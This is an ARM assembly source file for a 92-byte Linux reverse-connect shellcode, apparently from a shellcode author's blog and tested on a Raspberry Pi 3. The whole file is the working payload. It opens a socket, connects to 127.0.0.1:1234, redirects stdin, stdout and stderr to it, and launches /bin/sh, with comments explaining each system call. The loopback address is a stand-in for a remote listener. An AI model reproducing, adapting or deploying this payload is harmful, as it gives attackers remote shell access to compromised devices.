/**
  reverse connect shell to 127.0.0.1:1234
  tested with linux running on raspberry pi 3  
  
  executes in read-only memory
  
  http://modexp.wordpress.com/   
*/
    // 92 bytes
    
    .arch armv6
    .global _start
    .text

_start:

    .code 32
    ldr    r3, =#0xD204FF02 // htons(1234), AF_INET
    ldr    r4, =#0x0100007f // 127.0.0.1
    ldr    r5, =#0x6e69622f // /bin
    ldr    r6, =#0x68732f2f // //sh

    // switch to thumb mode    
    add    r0, pc, #1
    bx     r0 
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2  // r2 = IPPROTO_IP
    mov    r1, #1      // r1 = SOCK_STREAM
    mov    r0, #2      // r0 = AF_INET
    lsl    r7, r1, #8  // multiply by 256
    add    r7, #25     // 256+25 = socket
    svc    1

    mov    r8, r0       // r8 = s
    
    // connect(s, &sa, sizeof(sa));
    push   {r3, r4}     // save sa on stack
    mov    r1, sp       // r1 = &sa
    strb   r2, [r1, #1] // null the 0xFF in sa.family
    mov    r2, #16      // r2 = sizeof(sa)
    add    r7, #2       // r7 = 281+2 = connect
    svc    1
  
    // dup2(s, FILENO_STDIN);
    // dup2(s, FILENO_STDOUT);
    // dup2(s, FILENO_STDERR);
    mov    r1, #3      // for 3 descriptors
c_dup:
    mov    r7, #63     // r7 = dup 
    mov    r0, r8      // r0 = s
    sub    r1, #1      // decrease r1    
    svc    1
    bne    c_dup       // while (r1 != 0)

    // execve("/bin/sh", NULL, NULL);
    eor    r2, r2, r2 
    mov    r7, r2
    push   {r5, r6, r7}
    mov    r0, sp  
    mov    r7, #11       // r7 = execve
    svc    1
    nop                  // alignment by 4 bytes
    
